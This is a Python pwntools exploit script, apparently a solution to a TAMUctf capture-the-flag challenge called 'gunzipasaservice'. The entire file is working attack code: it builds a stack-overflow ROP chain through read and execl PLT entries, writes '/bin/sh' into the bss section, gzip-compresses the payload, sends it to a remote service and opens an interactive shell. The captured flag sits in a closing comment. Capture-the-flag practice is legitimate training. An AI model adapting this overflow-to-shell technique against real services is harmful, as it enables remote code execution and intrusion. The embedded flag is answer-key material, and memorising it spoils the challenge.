import gzip
import pwn


HOST, PORT = 'challenges.tamuctf.com', 4709
DEBUG = False

if DEBUG:
    p = pwn.process('./gunzipasaservice')
else:
    p = pwn.remote(HOST, PORT)
pwn.context.log_level = 'DEBUG'

read_plt = 0x08049040
execl_plt = 0x080490B0
pop_pop_pop_ret = 0x08049479

bss = 0x0804C048

payload = b'A' * 0x418
payload += pwn.p32(read_plt)
payload += pwn.p32(pop_pop_pop_ret)
payload += pwn.p32(0)
payload += pwn.p32(bss)
payload += pwn.p32(8)
payload += pwn.p32(execl_plt)
payload += b'AAAA'
payload += pwn.p32(bss)
payload += pwn.p32(0)

payload = gzip.compress(payload)
assert len(payload) <= 0x200

payload = payload.ljust(0x200, b'\x00')

p.send(payload)
p.send(b'/bin/sh\x00')

pwn.context.log_level = 'INFO'
p.interactive()

# gigem{r0p_71m3}
